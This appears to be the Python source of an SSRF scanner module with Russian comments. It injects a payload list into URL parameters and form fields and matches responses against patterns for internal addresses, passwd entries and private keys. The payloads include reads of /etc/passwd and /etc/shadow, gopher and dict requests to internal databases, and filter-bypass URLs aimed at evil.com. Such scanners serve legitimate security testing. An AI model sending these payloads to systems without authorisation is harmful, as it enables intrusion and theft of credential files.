import logging
from urllib.parse import urlparse, urljoin
from ..http_client_adapter import AiohttpClientAdapter
from typing import List, Dict, Optional
import re
from urllib.parse import parse_qs, urlencode

logger = logging.getLogger(__name__)

class SSRFScanner:
    def __init__(self, client=None):
        # Инициализация HTTP клиента
        self.client = client if client else AiohttpClientAdapter()
        
        # Список полезных нагрузок для тестирования SSRF уязвимостей
        self.payloads = [
            # Внутренние IP-адреса
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://[::1]',
            'http://[::]',
            
            # Внутренние сервисы
            'http://127.0.0.1:22',  # SSH
            'http://127.0.0.1:3306',  # MySQL
            'http://127.0.0.1:5432',  # PostgreSQL
            'http://127.0.0.1:27017',  # MongoDB
            'http://127.0.0.1:6379',  # Redis
            
            # Внутренние протоколы
            'file:///etc/passwd',
            'file:///etc/hosts',
            'file:///etc/shadow',
            'gopher://127.0.0.1:3306/_',
            'dict://127.0.0.1:3306/',
            
            # Обход фильтров
            'http://127.0.0.1.xip.io',
            'http://127.0.0.1.nip.io',
            'http://127.0.0.1.127.0.0.1',
            'http://127.0.0.1%23@evil.com',
            'http://127.0.0.1%2523@evil.com',
            
            # DNS-обход
            'http://localhost:80@evil.com',
            'http://127.0.0.1:80@evil.com',
            'http://[::1]:80@evil.com',
            'http://127.0.0.1%00evil.com',
            'http://127.0.0.1%0devil.com'
        ]
        
        # Паттерны для определения внутренних IP-адресов
        self.internal_ip_patterns = [
            r'127\.\d+\.\d+\.\d+',
            r'10\.\d+\.\d+\.\d+',
            r'172\.(1[6-9]|2\d|3[0-1])\.\d+\.\d+',
            r'192\.168\.\d+\.\d+',
            r'\[::1\]',
            r'\[::\]',
            r'localhost',
            r'0\.0\.0\.0'
        ]
        
        # Паттерны для определения конфиденциальных данных
        self.sensitive_patterns = [
            r'root:.*:0:0:',
            r'mysql:.*:',
            r'postgres:.*:',
            r'127\.0\.0\.1\s+localhost',
            r'PRIVATE KEY',
            r'BEGIN RSA PRIVATE KEY',
            r'BEGIN DSA PRIVATE KEY',
            r'BEGIN EC PRIVATE KEY',
            r'BEGIN OPENSSH PRIVATE KEY'
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        # Основной метод сканирования, который проверяет SSRF уязвимости
        vulnerabilities = []
        
        try:
            # Проверка параметров URL
            url_vulns = self._check_url_params(url)
            vulnerabilities.extend(url_vulns)
            
            # Проверка форм
            if forms:
                form_vulns = self._check_forms(url, forms)
                vulnerabilities.extend(form_vulns)
            
        except Exception as e:
            logger.error(f"SSRF scan error: {str(e)}")
        
        return vulnerabilities

    def _check_url_params(self, url: str) -> List[Dict]:
        # Проверка параметров URL на SSRF уязвимости
        vulnerabilities = []
        try:
            # Парсинг URL для получения параметров
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            # Проверка каждого параметра
            for param, values in params.items():
                for value in values:
                    for payload in self.payloads:
                        try:
                            # Создание URL с внедренной полезной нагрузкой
                            modified_params = params.copy()
                            modified_params[param] = [payload]
                            modified_query = urlencode(modified_params, doseq=True)
                            modified_url = parsed_url._replace(query=modified_query).geturl()
                            
                            # Отправка запроса
                            response = self.client.get(modified_url, timeout=10)
                            if not response:
                                continue
                            
                            # Проверка на уязвимость
                            if self._is_vulnerable(response.text, payload):
                                vulnerabilities.append({
                                    'type': 'SSRF',
                                    'url': modified_url,
                                    'payload': payload,
                                    'evidence': self._get_evidence(response.text, payload),
                                    'severity': 'high',
                                    'param': param,
                                    'method': 'GET'
                                })
                                break
                        
                        except Exception as e:
                            logger.error(f"URL parameter check error for {param}: {str(e)}")
        
        except Exception as e:
            logger.error(f"URL parameters check error: {str(e)}")
        
        return vulnerabilities

    def _check_forms(self, url: str, forms: List[Dict]) -> List[Dict]:
        # Проверка форм на SSRF уязвимости
        vulnerabilities = []
        try:
            for form in forms:
                # Получение метода и действия формы
                method = form.get('method', 'GET').upper()
                action = form.get('action', url)
                
                # Проверка каждого поля формы
                for field in form.get('fields', []):
                    field_name = field.get('name')
                    field_type = field.get('type', 'text')
                    
                    # Пропуск полей, не подходящих для SSRF
                    if field_type not in ['text', 'textarea', 'hidden', 'search', 'url']:
                        continue
                    
                    for payload in self.payloads:
                        try:
                            # Подготовка данных формы
                            form_data = {}
                            for f in form.get('fields', []):
                                if f.get('name') == field_name:
                                    form_data[f.get('name')] = payload
                                else:
                                    form_data[f.get('name')] = f.get('value', '')
                            
                            # Отправка запроса
                            if method == 'GET':
                                response = self.client.get(action, params=form_data, timeout=10)
                            else:
                                response = self.client.post(action, data=form_data, timeout=10)
                            
                            if not response:
                                continue
                            
                            # Проверка на уязвимость
                            if self._is_vulnerable(response.text, payload):
                                vulnerabilities.append({
                                    'type': 'SSRF',
                                    'url': action,
                                    'payload': payload,
                                    'evidence': self._get_evidence(response.text, payload),
                                    'severity': 'high',
                                    'param': field_name,
                                    'method': method
                                })
                                break
                        
                        except Exception as e:
                            logger.error(f"Form field check error for {field_name}: {str(e)}")
        
        except Exception as e:
            logger.error(f"Forms check error: {str(e)}")
        
        return vulnerabilities

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        # Проверка, является ли ответ уязвимым к SSRF
        try:
            # Проверка наличия внутренних IP-адресов
            for pattern in self.internal_ip_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
            
            # Проверка наличия конфиденциальных данных
            for pattern in self.sensitive_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
            
            # Проверка отражения полезной нагрузки
            if payload in response_text:
                return True
            
            return False
        
        except Exception as e:
            logger.error(f"Vulnerability check error: {str(e)}")
            return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        # Получение доказательства уязвимости
        try:
            # Поиск внутренних IP-адресов
            for pattern in self.internal_ip_patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return f"Internal IP address found: {match.group(0)}"
            
            # Поиск конфиденциальных данных
            for pattern in self.sensitive_patterns:
                match = re.search(pattern, response_text, re.IGNORECASE)
                if match:
                    return f"Sensitive data found: {match.group(0)}"
            
            # Поиск отражения полезной нагрузки
            if payload in response_text:
                return f"Payload '{payload}' was reflected in the response"
            
            return "SSRF vulnerability detected"
        
        except Exception as e:
            logger.error(f"Evidence collection error: {str(e)}")
            return "Error collecting evidence" 